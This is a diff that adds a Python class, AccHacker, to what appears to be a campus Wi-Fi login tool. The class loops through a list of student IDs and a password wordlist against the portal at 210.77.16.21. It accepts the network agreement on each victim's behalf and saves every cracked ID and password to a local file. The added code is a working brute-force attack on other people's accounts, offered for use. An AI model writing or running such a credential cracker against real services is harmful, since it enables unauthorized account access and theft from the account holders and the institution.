@@ -6,12 +6,108 @@
 # @WebSite : https://www.gentlecp.com
 import logging
 import json
+import time
 import datetime
 import requests
 from core.utils import util_login
 
 class WifiError(Exception):
     pass
+
+class AccHacker:
+    def __init__(self, data_path='data.txt',
+                 password_path = 'password.txt',
+                 accounts_path='accounts.json'):
+
+        self._logger = logging.getLogger("AccHacker")
+        self.d_accounts = None
+        self.l_stuids = []
+        self.l_passwords = []
+        self._data_path = data_path
+        self._accounts_path = accounts_path
+        self._password_path = password_path
+
+    def _set_info(self):
+        """
+        获取账户文件信息
+        :return: user_info
+        """
+        with open(self._accounts_path, 'r') as f:
+            self.d_accounts = json.loads(f.read())
+
+        with open(self._data_path, 'r') as f:
+            for line in f:
+                self.l_stuids.append(line.strip())
+
+        with open(self._password_path, 'r') as f:
+            for line in f:
+                self.l_passwords.append(line.strip())
+
+
+    def _save_accounts(self, accounts, datas):
+        with open(self._accounts_path, 'w') as f:
+            f.write(json.dumps(accounts))
+
+        with open(self._data_path, 'w') as f:
+            for data in datas:
+                f.write(data + '\n')
+
+    def __confirm_protocol(self, stuid, query_string):
+        headers = {
+            'Connection': 'keep-alive',
+            'Origin': 'http://210.77.16.21',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'Accept': '*/*',
+            'Referer': 'http://210.77.16.21/eportal/index.jsp?' + query_string,
+            'Accept-Encoding': 'gzip, deflate',
+            'Accept-Language': 'zh-CN,zh;q=0.9',
+        }
+        res = requests.post("http://210.77.16.21/eportal/InterFace.do?method=registerNetWorkProtocol",
+                            data={'userId': stuid},
+                            headers=headers)
+
+        if res.json()["result"] == "ok":
+            # 成功确认
+            return True
+
+    def _acc_hack(self):
+        cur = 1
+        range_num = len(self.l_passwords)
+        for stuid in self.l_stuids:
+            start = time.time()
+            hacked = False
+            for i,password in enumerate(self.l_passwords):
+                login_res = util_login(stuid, password)
+                print("\r","正在测试账号{},密码:{},预期进度：{:.2f}%,耗费时间:{:.2f}秒:".format(stuid,
+                                                                         password,
+                                                                         (i / range_num) * 100,
+                                                                         time.time() - start), end='', flush=True)
+                if login_res.get('result') == 'success':
+                    self.d_accounts["useful_accounts"].append({"stuid": stuid, "pwd": password})
+                    datas = self.l_stuids[cur:]
+                    cur += 1
+                    self._save_accounts(self.d_accounts, datas)
+                    self._logger.info("破解新账户:{}，已存储到本地".format(stuid))
+                    requests.get("http://210.77.16.21/eportal/InterFace.do?method=logout")  # 退出当前登录
+                    print("破解账号{}耗时:{:.2f}s".format(stuid, time.time() - start))
+                    hacked = True
+                    break
+                elif login_res.get('msg') == "密码不匹配,请输入正确的密码!":
+                    pass
+                elif login_res.get('msg') == "用户未确认网络协议书":
+                    self.__confirm_protocol(stuid,login_res.get('query_string'))
+                elif login_res.get('msg') == "认证设备响应超时,请稍后再试!":
+                    time.sleep(1)
+                else:
+                    print("出现异常:{}".format(login_res.get('msg')))
+            if not hacked:
+                self._logger.info("未能破解账户:{}".format(stuid))
+                print("未能破解账号{}耗时:{}s".format(stuid, time.time() - start))
+
+    def run(self):
+        self._set_info()
+        self._acc_hack()
 
 
 class WifiLoginer:
